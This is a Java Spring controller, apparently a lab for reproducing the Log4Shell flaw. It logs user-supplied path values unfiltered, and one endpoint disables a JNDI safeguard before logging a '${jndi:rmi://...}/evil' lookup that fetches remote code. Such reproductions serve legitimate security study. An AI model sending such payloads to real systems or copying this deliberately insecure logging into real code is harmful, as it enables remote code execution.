package com.bruce.log.controller;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RestController;

/**
 * @Copyright Copyright © 2021 fanzh . All rights reserved.
 * @Desc
 * @ProjectName log
 * @Date 2021/12/13 15:35
 * @Author fzh
 */
@RestController
public class LogController {

    private final Logger logger = LoggerFactory.getLogger(LogController.class);

    @GetMapping("/log/info/{msg}")
    public void info(@PathVariable String msg) {
        logger.info("hello :{}", msg);
    }

    @GetMapping("/log/warn/{msg}")
    public void warn(@PathVariable String msg) {
        logger.warn("hello :{}", msg);
    }

    @GetMapping("/log/error/{msg}")
    public void error(@PathVariable String msg) {
        logger.error("hello :{}", msg);
    }

    @GetMapping("/log/debug/{msg}")
    public void debug(@PathVariable String msg) {
        logger.debug("hello :{}", msg);
    }

    @GetMapping("/log/test")
    public void test() {
        String username = "${java:os}";
        logger.info("hello :{}", username);
    }

    @GetMapping("/log/evil")
    public void evil() {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        String username = "${jndi:rmi://127.0.0.1:1099/evil}";
        logger.info("hello :{}", username);
    }

}
